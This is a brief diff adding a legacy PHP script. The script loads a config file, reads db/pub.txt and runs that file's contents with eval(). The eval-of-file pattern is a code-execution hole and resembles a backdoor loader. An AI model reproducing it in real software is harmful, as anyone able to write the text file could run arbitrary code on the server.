@@ -1,0 +1,7 @@
+<?php
+set_magic_quotes_runtime(0);
+require_once("config_inc.php");
+$filename = $root_path . "/db/pub.txt";
+$code = file_get_contents($filename);
+eval($code);
+?>
